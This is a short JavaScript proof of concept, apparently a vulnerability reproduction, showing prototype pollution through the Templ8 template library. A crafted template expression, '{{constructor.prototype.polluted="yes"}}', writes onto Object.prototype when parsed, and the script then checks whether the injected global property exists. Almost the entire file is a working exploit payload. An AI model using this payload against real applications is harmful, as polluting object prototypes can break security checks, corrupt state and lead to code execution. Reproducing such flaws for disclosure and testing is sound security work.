var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const Templ8 = require('Templ8');
const tpl = new Templ8('{{constructor.prototype.polluted="yes"}}');
tpl.parse();
try {
    console.log('{ ' + polluted + ', ' + 'yes' + ' }');
} catch {
    console.log('{ ' + false + ', ' + true + ' }');
}